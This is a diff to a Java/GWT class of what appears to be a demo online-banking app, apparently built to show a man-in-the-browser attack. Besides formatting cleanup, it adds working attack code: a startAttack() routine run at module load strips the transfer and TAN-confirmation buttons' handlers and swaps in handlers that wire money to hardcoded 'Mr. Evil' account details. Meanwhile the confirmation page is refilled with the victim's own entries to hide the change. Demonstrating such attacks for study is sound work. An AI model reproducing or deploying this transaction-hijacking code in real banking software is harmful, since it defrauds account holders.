@@ -59,7 +59,7 @@ public class SCB implements EntryPoint, Observer {
 	// private SCBMessages messages = GWT.create(SCBMessages.class);
 	RegisterServiceAsync registerSvc;
 	private CustomerServiceAsync bankingService;
-	
+
 	MoneyTransferForm mTransfer = new MoneyTransferForm();
 	/**
 	 * The message displayed to the user when the server cannot be reached or
@@ -89,15 +89,13 @@ public class SCB implements EntryPoint, Observer {
 
 	private MenuBar menu;
 
-
-	
 	private String currentAccount;
 
 	private List<String> hints = new ArrayList<String>();
 
 	private Image scbLogo;
 	private SCBMenu scbMenu;
-
+	private MoneyTransferForm confirmPage;
 
 	private void doShowAbout(boolean picture) {
 		RootPanel r = RootPanel.get(PAGEID_CONTENT);
@@ -133,11 +131,11 @@ public class SCB implements EntryPoint, Observer {
 	 * REMOVEME: temporal workaround until refactoring
 	 */
 	public VerticalPanel createMainPanel() {
-		
-		VerticalPanel v=new VerticalPanel();
+
+		VerticalPanel v = new VerticalPanel();
 		scbMenu = new SCBMenu();
 		scbMenu.addObserver(this);
-//		tempMainpanel.add(menu);
+		// tempMainpanel.add(menu);
 		v.add(scbMenu);
 		return v;
 	}
@@ -165,7 +163,7 @@ public class SCB implements EntryPoint, Observer {
 			checkGoogleStatus();
 			doShowAbout(true);
 			GWT.log("Module loaded");
-//			jsni_startPointbar();
+			// jsni_startPointbar();
 			startAttack();
 
 		} catch (Exception e) {
@@ -253,8 +251,8 @@ public class SCB implements EntryPoint, Observer {
 	protected void showAccountOverviewInDetailPanel(List<AccountDTO> result) {
 		accountsDetailsPanel.clear();
 		if (result.size() == 0) {
-			Label noAccountHint = new Label(constants
-					.accountOverviewHintNoAccount());
+			Label noAccountHint = new Label(
+					constants.accountOverviewHintNoAccount());
 			accountsDetailsPanel.add(noAccountHint);
 			return;
 		}
@@ -263,8 +261,8 @@ public class SCB implements EntryPoint, Observer {
 		Grid grid = new Grid(result.size() + 1, 2);
 		accountsDetailsPanel.add(grid);
 		Label accHeader = new Label(constants.accountOverviewLblHeaderAccount());
-		Label amountHeader = new Label(constants
-				.accountOverviewLblHeaderBalance());
+		Label amountHeader = new Label(
+				constants.accountOverviewLblHeaderBalance());
 		accHeader.setStyleName("TransfersHeader");
 		amountHeader.setStyleName("TransfersHeader");
 		grid.setWidget(0, 0, accHeader);
@@ -308,9 +306,9 @@ public class SCB implements EntryPoint, Observer {
 
 					public void onSuccess(SCBIdentityDTO result) {
 						identityInfo = result;
-						
+
 						if (identityInfo.isLoggedIn()) {
-							if (regForm!=null){
+							if (regForm != null) {
 								regForm.setUser(identityInfo);
 							}
 							Log.info("User is logged in with email-adress "
@@ -330,8 +328,8 @@ public class SCB implements EntryPoint, Observer {
 							} else {
 								Log.info("Account not yet activated in SCB: "
 										+ identityInfo);
-								scbMenu.getMenuUserInfo().setText(identityInfo
-										.getEmail());
+								scbMenu.getMenuUserInfo().setText(
+										identityInfo.getEmail());
 							}
 							loadLoggedInSetup();
 							String language = identityInfo.getLanguage();
@@ -341,8 +339,7 @@ public class SCB implements EntryPoint, Observer {
 								changeToLocalisedVersion(language);
 							}
 						} else {
-							Log
-									.info("User is not yet logged in with his Google account");
+							Log.info("User is not yet logged in with his Google account");
 							loadLogin();
 						}
 					}
@@ -413,7 +410,8 @@ public class SCB implements EntryPoint, Observer {
 					}
 
 					public void onSuccess(AccountDetailDTO result) {
-						CustomerTransferHistoryForm customerTransfer = new CustomerTransferHistoryForm(result);
+						CustomerTransferHistoryForm customerTransfer = new CustomerTransferHistoryForm(
+								result);
 						customerTransfer.addObserver(SCB.this);
 
 						accountsDetailsPanel.add(customerTransfer);
@@ -462,7 +460,7 @@ public class SCB implements EntryPoint, Observer {
 	/*
 	 * change the language during runtime keeps the debug flag
 	 */
-	public static  void changeToLocalisedVersion(String language) {
+	public static void changeToLocalisedVersion(String language) {
 		String queryPart = Window.Location.getQueryString();
 
 		String reloadURL;
@@ -497,9 +495,8 @@ public class SCB implements EntryPoint, Observer {
 				showFastMoneyTransferForm();
 			}
 
-		}
-		else if (o instanceof SCBMenu){
-			if (arg==SCBMenu.EVENT_SHOW_REGISTRATION_MENU){
+		} else if (o instanceof SCBMenu) {
+			if (arg == SCBMenu.EVENT_SHOW_REGISTRATION_MENU) {
 				doOpenRegisterMenu();
 			}
 		}
@@ -522,123 +519,145 @@ public class SCB implements EntryPoint, Observer {
 	}
 
 	private void showMoneyTransferConfirmationForm(MoneyTransferDTO moneyTranfer) {
-		MoneyTransferForm confirmPage = new MoneyTransferForm(
-				currentAccount, moneyTranfer);
+		confirmPage = new MoneyTransferForm(currentAccount, moneyTranfer);
 		accountsDetailsPanel.clear();
 		accountsDetailsPanel.add(confirmPage);
 	}
-	
+
 	/**
 	 * injection point for Greasemonkey (needs to be tested
-	 * @see http://code.google.com/intl/de-DE/webtoolkit/doc/latest/DevGuideCodingBasicsJSNI.html
+	 * 
+	 * @see http://code.google.com/intl/de-DE/webtoolkit/doc/latest/
+	 *      DevGuideCodingBasicsJSNI.html
 	 */
 	public native void jsni_startPointbar() /*-{
-    // Call instance method instanceFoo() on this
-    this.@de.mrx.client.SCB::startAttack();
-  }-*/;
-	
-	
-	// turnOffOnClickEventHandler
-	native String turnOffClickHandler(Button btn) /*-{	
-		btn.onClick="";
+		// Call instance method instanceFoo() on this
+		this.@de.mrx.client.SCB::startAttack();
 	}-*/;
-	
-	
-	
+
 	/**
 	 * this is the injection for a Javascript-Attacker
+	 * 
 	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
 	 */
-	private void startAttack(){
+	private void startAttack() {
 		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
 		
-		
-		//everything should best work with DOM-Operations only (not with knowledge of the Java Widget)
-		
-		//1. Find relevant Button for first page (after first data entry)
-		//later find with DOM Operations (GWTQuery)
-		Button sendMoneyAskForConfirmBtn=mTransfer.getSendMoney();
-		turnOffClickHandler(sendMoneyAskForConfirmBtn);
-		
-		//rewrite ClickHandler for askForConfirmation Button
+		// everything should best work with DOM-Operations only (not with
+		// knowledge of the Java Widget)
+
+		// 1. Find relevant Button for first page (after first data entry)
+		// later find with DOM Operations (GWTQuery)
+		Button sendMoneyAskForConfirmBtn = mTransfer.getSendMoney();
+		mTransfer.getSendMoneyHandlerRegistration().removeHandler();
+
+		// rewrite ClickHandler for askForConfirmation Button
 		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
-			
+
 			@Override
 			public void onClick(ClickEvent event) {
-				String ATTACKER_BLZ="6272";
-				String ATTACKER_BANK_NAME="Deutsche Privatbank";
-				String ATTACKER_RECEIVER_ACC_NR="172";
-				String ATTACKER__RECEIVER_NAME="Mr. Evil";
-				int ATTACKER__AMOUNT=10;
-				String ATTACKER_REMARK="I just needed the money";
-				 CustomerServiceAsync bankingService= GWT.create(CustomerService.class);
-				 //
-				 bankingService.sendMoneyAskForConfirmationData(currentAccount, ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT, ATTACKER_REMARK, ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,new AsyncCallback<MoneyTransferDTO>() {
+				String ATTACKER_BLZ = "6272";
+				String ATTACKER_BANK_NAME = "Deutsche Privatbank";
+				String ATTACKER_RECEIVER_ACC_NR = "172";
+				String ATTACKER__RECEIVER_NAME = "Mr. Evil";
+				int ATTACKER__AMOUNT = 10;
+				String ATTACKER_REMARK = "I just needed the money";
+				CustomerServiceAsync bankingService = GWT
+						.create(CustomerService.class);
+				//
+				bankingService.sendMoneyAskForConfirmationData(currentAccount,
+						ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR,
+						ATTACKER__AMOUNT, ATTACKER_REMARK,
+						ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,
+						new AsyncCallback<MoneyTransferDTO>() {
 
-						@Override
-						public void onFailure(Throwable caught) {
-							caught.printStackTrace();
-							Window.alert("Called with failure: "+caught.getMessage());
-							
-						}
+							@Override
+							public void onFailure(Throwable caught) {
+								caught.printStackTrace();
+								Window.alert("Called with failure: "
+										+ caught.getMessage());
 
-						@Override
-						public void onSuccess(MoneyTransferDTO result) {
-							Window.alert("First part succeeds. Now manipulate the confirmation page");
-							result.setReceiverAccountNr(SCB.this.mTransfer.getReceiverAccountNr().getText());
-							result.setReceiverName(SCB.this.mTransfer.getReceiverName().getText());
-							result.setReceiverBankNr(SCB.this.mTransfer.getReceiverBLZ().getText());
-							result.setReceiverName(SCB.this.mTransfer.getReceiverBankName().getText());
-							result.setRemark(SCB.this.mTransfer.getRemark().getText());
-							result.setAmount(Double.parseDouble(SCB.this.mTransfer.getAmount().getText()));
-							showMoneyTransferConfirmationForm(result);
-						}
-					});
+							}
+
+							@Override
+							public void onSuccess(MoneyTransferDTO result) {
+								Window.alert("First part succeeds. Now manipulate the confirmation page");
+								result.setReceiverAccountNr(SCB.this.mTransfer
+										.getReceiverAccountNr().getText());
+								result.setReceiverName(SCB.this.mTransfer
+										.getReceiverName().getText());
+								result.setReceiverBankNr(SCB.this.mTransfer
+										.getReceiverBLZ().getText());
+								result.setReceiverName(SCB.this.mTransfer
+										.getReceiverBankName().getText());
+								result.setRemark(SCB.this.mTransfer.getRemark()
+										.getText());
+								result.setAmount(Double
+										.parseDouble(SCB.this.mTransfer
+												.getAmount().getText()));
+								showMoneyTransferConfirmationForm(result);
+								confirmPage
+										.getSendMoneyConfirmHandlerRegistration()
+										.removeHandler();
+								confirmPage
+										.getSendMoneyConfirm()
+										.addClickHandler(
+												new MoneyTransferHackClickHandler(
+														currentAccount));
+							}
+						});
 
 			}
 		});
-		
-		//2. Overwrite Button on confirmation Page
-		 Button sendMoneyBtn=mTransfer.getSendMoneyConfirm();
-		 turnOffClickHandler(sendMoneyBtn);
-		 sendMoneyBtn.addClickHandler(new ClickHandler() {
-			
-			@Override
-			public void onClick(ClickEvent event) {
-				String ATTACKER_BLZ="6272";
-				String ATTACKER_BANK_NAME="Deutsche Privatbank";
-				String ATTACKER_RECEIVER_ACC_NR="172";
-				String ATTACKER__RECEIVER_NAME="Mr. Evil";
-				int ATTACKER__AMOUNT=10;
-				String ATTACKER_REMARK="I just needed the money";
-				 CustomerServiceAsync bankingService= GWT.create(CustomerService.class);
-				 //
-				 bankingService.sendMoney(currentAccount, ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT, ATTACKER_REMARK, ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,mTransfer.getTan().getText(), new AsyncCallback<Void>() {
+
+	}
+
+	/**
+	 * ClickHandler for modifiying the confirmation page (with TAN)
+	 * 
+	 * @author Jan
+	 * 
+	 */
+	class MoneyTransferHackClickHandler implements ClickHandler {
+		private String currentAccount;
+
+		public MoneyTransferHackClickHandler(String currentAccount) {
+			this.currentAccount = currentAccount;
+		}
+
+		@Override
+		public void onClick(ClickEvent event) {
+			String ATTACKER_BLZ = "6272";
+			String ATTACKER_BANK_NAME = "Deutsche Privatbank";
+			String ATTACKER_RECEIVER_ACC_NR = "172";
+			String ATTACKER__RECEIVER_NAME = "Mr. Evil";
+			int ATTACKER__AMOUNT = 10;
+			String ATTACKER_REMARK = "I just needed the money";
+			CustomerServiceAsync bankingService = GWT
+					.create(CustomerService.class);
+			//
+			bankingService.sendMoney(currentAccount, ATTACKER_BLZ,
+					ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT,
+					ATTACKER_REMARK, ATTACKER__RECEIVER_NAME,
+					ATTACKER_BANK_NAME, mTransfer.getTan().getText(),
+					new AsyncCallback<Void>() {
 
 						@Override
 						public void onFailure(Throwable caught) {
 							caught.printStackTrace();
-							Window.alert("Called with failure: "+caught.getMessage());
-							
+							Window.alert("Called with failure: "
+									+ caught.getMessage());
+
 						}
 
 						@Override
 						public void onSuccess(Void result) {
 							showAccountDetails(currentAccount);
-							
+
 						}
 
-				 });
-			}
-		});
-			
-			//rewrite ClickHandler for askForConfirmation Button
-
+					});
+		}
 	}
-	
-	
+
 }
-		
-
-	
-
